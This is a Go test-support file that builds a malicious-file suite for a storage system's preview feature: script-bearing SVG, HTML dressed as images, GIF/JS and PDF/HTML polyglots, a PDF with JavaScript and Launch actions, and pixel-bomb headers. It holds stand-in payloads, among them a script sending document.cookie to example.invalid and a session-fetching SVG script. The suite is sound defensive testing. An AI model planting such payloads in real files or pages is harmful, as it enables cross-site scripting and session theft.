// Package previewtest makes the files of the malicious-file suite of
// previews (PLAN O.11, ADR-0028): files made to be taken for what they are
// not - markup and script dressed as images, polyglots that are two things
// at once, headers that claim billions of pixels, headers cut short - each
// with the type it is stored as and what a preview must come to.
//
// Every file is made here, by code, so that a reader sees what it is made
// of: none is downloaded, and none is kept as bytes without the code that
// made it. The suites of the domain (internal/domain/preview), of the use
// case (internal/app) and of the management API (internal/adapters/adminapi)
// all judge the same cases.
package previewtest

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/albievan/cactusfs/internal/domain"
	"github.com/albievan/cactusfs/internal/domain/preview"
)

// Marker is in every file of the suite that carries script or markup: an
// answer that holds it has sent something of the file.
const Marker = "cactusfs-malicious"

// Case is a file of the suite, stored with a type, and what a preview of it
// comes to.
type Case struct {
	// Name says what the file is and what it is stored as.
	Name string
	// StoredType is the type the object is stored with; "" for none.
	StoredType string
	// Data is the whole of the object.
	Data []byte
	// Kind is what the preview shows it as - always as an attachment of
	// application/octet-stream - or "" when it is refused.
	Kind preview.Kind
	// Refusal is the domain error a refusal wraps: domain.ErrNotPreviewable
	// (415) or domain.ErrPreviewTooLarge (413). Nil when it is shown.
	Refusal error
	// ByType says that the stored type alone refuses it: no shard of it
	// is read.
	ByType bool
}

// Cases returns the files of the suite. They are made anew on each call.
func Cases() []Case {
	svg := SVGWithScript()
	html := HTMLPage()
	gifJS := GIFScriptPolyglot()
	pdfHTML := PDFHTMLPolyglot()
	htmlPDF := HTMLPDFPolyglot()
	huge := PNGHeader(65535, 65535)
	return []Case{
		{Name: "SVG with a script, stored as SVG", StoredType: "image/svg+xml", Data: svg, Refusal: domain.ErrNotPreviewable, ByType: true},
		{Name: "SVG with a script, stored as PNG", StoredType: "image/png", Data: svg, Refusal: domain.ErrNotPreviewable},
		{Name: "SVG with a script, stored untyped", StoredType: "", Data: svg, Refusal: domain.ErrNotPreviewable},
		{Name: "SVG with a script, stored as octet-stream", StoredType: "application/octet-stream", Data: svg, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML stored as PNG", StoredType: "image/png", Data: html, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML stored as JPEG", StoredType: "image/jpeg", Data: html, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML stored as PDF", StoredType: "application/pdf", Data: html, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML stored as DOCX", StoredType: DOCXType, Data: html, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML stored as HTML", StoredType: "text/html; charset=utf-8", Data: html, Refusal: domain.ErrNotPreviewable, ByType: true},
		{Name: "HTML stored as XHTML", StoredType: "application/xhtml+xml", Data: html, Refusal: domain.ErrNotPreviewable, ByType: true},
		{Name: "HTML stored as text is text", StoredType: "text/plain", Data: html, Kind: preview.KindText},
		{Name: "GIF/JS polyglot stored as GIF", StoredType: "image/gif", Data: gifJS, Kind: preview.KindGIF},
		{Name: "GIF/JS polyglot stored untyped", StoredType: "", Data: gifJS, Kind: preview.KindGIF},
		{Name: "GIF/JS polyglot stored as script", StoredType: "text/javascript", Data: gifJS, Refusal: domain.ErrNotPreviewable, ByType: true},
		{Name: "GIF/JS polyglot stored as text", StoredType: "text/plain", Data: gifJS, Refusal: domain.ErrNotPreviewable},
		// Text of ASCII alone - no NUL, nothing that is not UTF-8 - that
		// begins with the signature of a binary kind is not text.
		{Name: "a script of ASCII that begins GIF89a, stored as text", StoredType: "text/plain", Data: ASCIIGIFScript(), Refusal: domain.ErrNotPreviewable},
		{Name: "GIF/JS polyglot stored as PNG", StoredType: "image/png", Data: gifJS, Refusal: domain.ErrNotPreviewable},
		{Name: "PDF/HTML polyglot stored as PDF", StoredType: "application/pdf", Data: pdfHTML, Kind: preview.KindPDF},
		{Name: "PDF/HTML polyglot stored untyped", StoredType: "application/octet-stream", Data: pdfHTML, Kind: preview.KindPDF},
		{Name: "PDF/HTML polyglot stored as HTML", StoredType: "text/html", Data: pdfHTML, Refusal: domain.ErrNotPreviewable, ByType: true},
		{Name: "PDF/HTML polyglot stored as text", StoredType: "text/plain", Data: pdfHTML, Refusal: domain.ErrNotPreviewable},
		{Name: "HTML of ASCII after a PDF header, stored as text", StoredType: "text/plain", Data: ASCIIPDFPage(), Refusal: domain.ErrNotPreviewable},
		{Name: "HTML/PDF polyglot, its PDF after the markup, stored as PDF", StoredType: "application/pdf", Data: htmlPDF, Refusal: domain.ErrNotPreviewable},
		{Name: "PDF with JavaScript, OpenAction, Launch and a link", StoredType: "application/pdf", Data: PDFWithActions(), Kind: preview.KindPDF},
		{Name: "PNG header of 65 535 × 65 535", StoredType: "image/png", Data: huge, Refusal: domain.ErrPreviewTooLarge},
		{Name: "PNG header of 65 535 × 65 535, untyped", StoredType: "", Data: huge, Refusal: domain.ErrPreviewTooLarge},
		{Name: "GIF of a 1 × 1 screen with a frame of 65 535 × 65 535", StoredType: "image/gif", Data: GIFFrameBomb(), Refusal: domain.ErrPreviewTooLarge},
		{Name: "PNG cut in its header", StoredType: "image/png", Data: huge[:20], Refusal: domain.ErrNotPreviewable},
		{Name: "PNG of its signature alone", StoredType: "image/png", Data: huge[:8], Refusal: domain.ErrNotPreviewable},
		{Name: "PNG cut in its signature", StoredType: "image/png", Data: huge[:5], Refusal: domain.ErrNotPreviewable},
		{Name: "PDF cut in its signature", StoredType: "application/pdf", Data: []byte("%PDF"), Refusal: domain.ErrNotPreviewable},
		{Name: "PDF cut in its signature, untyped", StoredType: "", Data: []byte("%PD"), Refusal: domain.ErrNotPreviewable},
		// The signature is all a PDF must have to be one: the console's
		// reader, which never runs anything, says that it is damaged.
		{Name: "PDF of its signature alone", StoredType: "application/pdf", Data: []byte("%PDF-"), Kind: preview.KindPDF},
		{Name: "an empty object stored as PNG", StoredType: "image/png", Data: nil, Refusal: domain.ErrNotPreviewable},
	}
}

// DOCXType is the type of a Word document of Office Open XML.
const DOCXType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"

// SVGWithScript is an SVG image that runs a script when a browser renders
// it as SVG, and on load of an element.
func SVGWithScript() []byte {
	return []byte(`<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="alert('` + Marker + `')">` +
		`<script>fetch('/api/v1/session').then(r => r.text()).then(t => alert(t + '` + Marker + `'))</script>` +
		`<rect width="10" height="10"/></svg>` + "\n")
}

// HTMLPage is a page of HTML with a script.
func HTMLPage() []byte {
	return []byte("<!DOCTYPE html>\n<html><head><title>" + Marker + "</title></head>" +
		"<body><script>document.location = 'https://example.invalid/?' + document.cookie</script>" +
		"<img src=x onerror=\"alert('" + Marker + "')\"></body></html>\n")
}

// GIFScriptPolyglot is a GIF that a browser draws - a 10 799 × 10 screen
// with one frame inside it - and also a script: "GIF89a" is a name, the
// screen's width opens a comment that the bytes after the trailer close,
// and what follows is a statement.
func GIFScriptPolyglot() []byte {
	b := []byte("GIF89a/*")               // the signature, and the width 0x2A2F = 10 799
	b = append(b, 0x0A, 0x00, 0x00, 0, 0) // the height 10, no colour table, background, aspect
	b = append(b, gifFrame(0, 0, 1, 1)...)
	b = append(b, 0x3B) // the trailer
	return append(b, "*/=1;alert('"+Marker+"');//"...)
}

// ASCIIGIFScript is a script of ASCII alone that begins with the signature
// of a GIF: "GIF89a" is a name it assigns to.
func ASCIIGIFScript() []byte {
	return []byte("GIF89a=1;alert('" + Marker + "');//\n")
}

// ASCIIPDFPage is a PDF header followed by a page of HTML, in ASCII alone:
// no binary comment, no NUL.
func ASCIIPDFPage() []byte {
	return []byte("%PDF-1.7\n<html><body><script>alert('" + Marker + "')</script></body></html>\n")
}

// GIFFrameBomb is a GIF whose screen is 1 × 1 and whose one frame is
// 65 535 × 65 535: a browser would make a frame of 4 billion pixels.
func GIFFrameBomb() []byte {
	b := []byte("GIF89a\x01\x00\x01\x00\x00\x00\x00")
	b = append(b, gifFrame(0, 0, 65535, 65535)...)
	return append(b, 0x3B)
}

// gifFrame is an image descriptor without a colour table of its own, and
// its data: the minimum code size and one sub-block.
func gifFrame(left, top, width, height uint16) []byte {
	b := []byte{0x2C}
	for _, v := range []uint16{left, top, width, height} {
		b = binary.LittleEndian.AppendUint16(b, v)
	}
	return append(b, 0x00, 0x02, 0x02, 0x4C, 0x01, 0x00)
}

// PNGHeader is the signature and the IHDR chunk of a PNG of the size given,
// and no image data: what a few bytes may claim.
func PNGHeader(width, height uint32) []byte {
	b := []byte("\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR")
	b = binary.BigEndian.AppendUint32(b, width)
	b = binary.BigEndian.AppendUint32(b, height)
	return append(b, 8, 6, 0, 0, 0, 0x00, 0x00, 0x00, 0x00)
}

// PNGOf is a PNG header of the size given, padded to n bytes.
func PNGOf(width, height uint32, n int) []byte {
	b := PNGHeader(width, height)
	return append(b, bytes.Repeat([]byte{0x42}, max(0, n-len(b)))...)
}

// OneByteOver is a PNG of 10 × 10 pixels one byte larger than limit: a
// preview whose cap is limit refuses it by its size alone.
func OneByteOver(limit int) []byte {
	return PNGOf(10, 10, limit+1)
}

// PDFHTMLPolyglot is a PDF - pdf.js opens it - whose first comment is a
// page of HTML with a script: a browser that sniffed it as HTML would run
// it.
func PDFHTMLPolyglot() []byte {
	return PDF("%<html><body><script>alert('"+Marker+"')</script></body></html>",
		"<< /Type /Catalog /Pages 2 0 R >>",
		"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
		"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>",
	)
}

// HTMLPDFPolyglot is a page of HTML followed by a PDF: what a reader that
// looks for "%PDF-" anywhere in the first kilobyte, as some do, takes for a
// PDF.
func HTMLPDFPolyglot() []byte {
	return append(HTMLPage(), PDFHTMLPolyglot()...)
}

// PDFWithActions is a PDF of one page that asks to run a script when it is
// opened (/OpenAction and /Names /JavaScript), to launch a program, and to
// follow a link: the page has a link annotation to an address and one that
// launches.
func PDFWithActions() []byte {
	return PDF("",
		"<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R /Names << /JavaScript << /Names [("+Marker+") 4 0 R] >> >> >>",
		"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
		"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Annots [5 0 R 6 0 R] >>",
		"<< /Type /Action /S /JavaScript /JS (app.alert\\('"+Marker+"'\\); this.submitForm\\('https://example.invalid/'\\);) >>",
		"<< /Type /Annot /Subtype /Link /Rect [10 10 190 50] /Border [0 0 0] /A << /S /URI /URI (https://example.invalid/"+Marker+") >> >>",
		"<< /Type /Annot /Subtype /Link /Rect [10 60 190 100] /Border [0 0 0] /A << /S /Launch /F (calc.exe) /Win << /F (cmd.exe) /P (/c echo "+Marker+") >> >> >>",
	)
}

// PDF is a PDF of the objects given - numbered from 1, the first the
// catalogue - with a cross-reference table whose offsets are those of the
// objects. comment, when not empty, is a line after the header; it must
// begin with "%".
func PDF(comment string, objects ...string) []byte {
	var b bytes.Buffer
	b.WriteString("%PDF-1.7\n%\xE2\xE3\xCF\xD3\n")
	if comment != "" {
		b.WriteString(strings.ReplaceAll(comment, "\n", " ") + "\n")
	}
	offsets := make([]int, len(objects))
	for i, object := range objects {
		offsets[i] = b.Len()
		fmt.Fprintf(&b, "%d 0 obj\n%s\nendobj\n", i+1, object)
	}
	xref := b.Len()
	fmt.Fprintf(&b, "xref\n0 %d\n0000000000 65535 f \n", len(objects)+1)
	for _, offset := range offsets {
		fmt.Fprintf(&b, "%010d 00000 n \n", offset)
	}
	fmt.Fprintf(&b, "trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", len(objects)+1, xref)
	return b.Bytes()
}
